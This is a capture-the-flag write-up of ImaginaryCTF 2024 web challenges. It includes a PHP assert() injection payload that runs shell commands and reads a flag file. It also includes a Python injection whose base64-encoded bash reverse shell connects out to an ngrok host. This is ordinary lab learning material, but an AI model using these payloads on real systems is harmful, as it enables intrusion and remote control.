<h3> Imaginary CTF 2024 </h3>

![image](https://github.com/user-attachments/assets/39f0b7e9-9548-427f-9e9a-653f6514afd6)

Hello guys, I'm `0x1337` and last night I participated in ImaginaryCTF 

Even though I started really late i'm happy to have least solved some challenges

And in this writeup I'll go through the challenges which I solved

### Web
- Readme
- Journal
- PC2
- Crystals
- Readme2

### Reversing
- Unoriginal
- Rust
- BF
- Absolute Flag Checker
- Watchdog

### Pwn
- Imgstore
- Ropity
- Onewrite


---
---

### Web

#### Readme
![image](https://github.com/user-attachments/assets/83893b67-ce4e-4b9f-94f5-d449f57b339b)

We are given the web instance and a file sharing server which has a compressed archive
![image](https://github.com/user-attachments/assets/f3a804c0-ee26-4ce4-8081-22a17d73342f)

After downloading it I uncompressed it and got this
![image](https://github.com/user-attachments/assets/f3c6e762-d328-414c-af87-d3e05ed34d7f)

So that's the application source code

Opening it in VSCode I saw the flag in the `Dockerfile` 
![image](https://github.com/user-attachments/assets/d980e458-4cfa-4eb3-9ad7-a5f8a71465fc)

It seems this was unintended which lead to the release of `Readme2` i presume

In any case I got the flag

```
Flag: ictf{path_normalization_to_the_rescue}
```

#### Journal
![image](https://github.com/user-attachments/assets/af6b8d8f-f7a3-4b35-96a5-ec9aba56ef8b)

After downloading the zip file from the file sharing server I uncompressed it which gave the source code
![image](https://github.com/user-attachments/assets/8765564e-ae62-48cb-bc62-34548ada272d)

You can ignore the `test.php` as it wasn't there initially (i created it for debugging0

Let's check out the source code but before that it's good practice to check the `Dockerfile`
![image](https://github.com/user-attachments/assets/92d25f25-1bbd-4e93-9b2c-f6b7f20ceff2)

Basically this Dockerfile would install `php:7-apache` then do some web server configuration

And what i mean by that is this:
- Setups the web server files
- Starts Apache HTTP Server in the foreground while setting specific environment variables and user/group permissions. 
- Randomize the flag file name

Ok at this point we know that the `flag.txt` file would be of a random name stored in `/`

That means we might need to get `RCE` to get the name and it's content

Moving on we can check the application source code which is `index.php`
![image](https://github.com/user-attachments/assets/fc9faa9d-7a84-4ec8-bf1b-16afea34e301)

```php
<?php

echo "<p>Welcome to my journal app!</p>";
echo "<p><a href=/?file=file1.txt>file1.txt</a></p>";
echo "<p><a href=/?file=file2.txt>file2.txt</a></p>";
echo "<p><a href=/?file=file3.txt>file3.txt</a></p>";
echo "<p><a href=/?file=file4.txt>file4.txt</a></p>";
echo "<p><a href=/?file=file5.txt>file5.txt</a></p>";
echo "<p>";

if (isset($_GET['file'])) {
  $file = $_GET['file'];
  $filepath = './files/' . $file;

  assert("strpos('$file', '..') === false") or die("Invalid file!");
// 
  if (file_exists($filepath)) {
    include($filepath);
  } else {
    echo 'File not found!';
  }
}

echo "</p>";

?>
```

The code isn't much and basically it would include any file passed to the `file` parameter considering it's valid

So this is an `LFI` sort of challenge!

But the issue here is that before it includes our file it would check for the occurrence of `..` in our input, and that's to prevent us from doing directory transversal

The odd thing here is that it uses `assert` for the check

And one issue about `assert` is that it basically does an `eval()` based on the string passed into it

Ok good we can leverage this to get `RCE` 

In order to do that we need to first escape the `strpos` call and here's how I did that

```
rce' and die(system(ls)) or '
```

I got that payload from [hacktricks](https://book.hacktricks.xyz/pentesting-web/file-inclusion#lfi-via-phps-assert)

Doing that works and I got the current files in that directory
![image](https://github.com/user-attachments/assets/660f400d-32f5-4639-96b9-935b1adbc568)

To get full command execution I used this:
![image](https://github.com/user-attachments/assets/3cb78497-2753-4913-8f84-d757cff22e90)

```
rce' and die(system($_GET['cmd'])) or '&cmd=ls -al
```

Now we can get the flag file name
![image](https://github.com/user-attachments/assets/bcee56f8-008f-43b9-8837-4276c3e6df12)

And then we concatenate it :)
![image](https://github.com/user-attachments/assets/7fe8a59b-4b3a-49e5-988a-fbff042a9095)

```
http://journal.chal.imaginaryctf.org/?file=rce' and die(system($_GET['cmd'])) or '&cmd=cat /flag-cARdaInFg6dD10uWQQgm.txt
```

Cool we got the flag

```
Flag: ictf{assertion_failed_e3106922feb13b10}
```

#### PC2
![image](https://github.com/user-attachments/assets/116d8819-66d3-4211-b047-99acfddfbd56)

As usual we are given the source which we i already downloaded
![image](https://github.com/user-attachments/assets/ef8b62d3-4651-4f3f-90f3-471919416169)

It's a python web application so let's start by checking the `Dockerfile`
![image](https://github.com/user-attachments/assets/99e031fe-aed3-4208-a51a-803d268eb263)

Nothing much here just some setups

Ok so let's check the app source code
![image](https://github.com/user-attachments/assets/839ad87b-4d76-4d88-b7e0-bde4779becc2)
![image](https://github.com/user-attachments/assets/79ae8be4-ba76-424b-95c9-3e981babeaea)

The only available route is `/` and what it does is this:
- Retrieves the `code` body parameter if the http request method is `POST`
- Calls function `xec()` passing the data body as the argument
- Does some regular expression check and if the pattern check doesn't return `None` it would render the `index.html` template

So far nothing interesting here

Let's check the `xec` function
- It would indent the parameter passed into the function
- Generates a random file name based on the `md5` hash of the code content
- Does some python templating inroder to make it a valid python code
- Makes it executable
- And finally runs the python code

The thing of interest here is that it would use our input value and add it to a template which would be stored as a python code then executed

I copied the `xec` function to know how the final python code would be based on our input and saw this
![image](https://github.com/user-attachments/assets/9623c760-0620-486a-a831-730c8570cd56)

This is how the final code would be:

```
def main():
    print('hi')
from parse import rgb_parse
print(rgb_parse(main())
```

We can decide to check the `parse.rgp_parse` function but that's not needed because `main()` would be called first and it's the value returned from it that's going to be used in the function

In order words because we have control over what will be executed we can inject our malicious code and it would get executed

Cool!

I decided to just get a reverse shell

First I setup ngrok then base64 encode my reverse shell
![image](https://github.com/user-attachments/assets/75358e96-3dee-42be-bf75-03dfdec28d15)

Now i just need to use the `os` module then access the `system` function to execute shell command

Here's my payload
![image](https://github.com/user-attachments/assets/80c98104-f180-4e15-b47f-dc97006bce31)

```python
import os
os.system('echo YmFzaCAtaSA+JiAvZGV2L3RjcC80LnRjcC51cy1jYWwtMS5uZ3Jvay5pby8xNTkxNCAwPiYx | base64 -d | bash')
```

Back to my netcat listener I got a reverse shell
![image](https://github.com/user-attachments/assets/39fcafbb-b047-49be-b1e6-7df4d7af405d)

```
Flag: ictf{d1_color_picker_fr_2ce0dd3d}
```


































